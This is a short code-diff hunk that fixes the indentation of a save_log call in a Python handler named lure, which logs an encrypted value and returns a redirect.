@@ -113,7 +113,7 @@ def lure(key):
         "count": 1,
         "lure" : str(encrypt.encrypt_logs(key, password)),
         }
-     save_log(log)
+    save_log(log)
 
     return redirect(redirect_url, code=302)
 
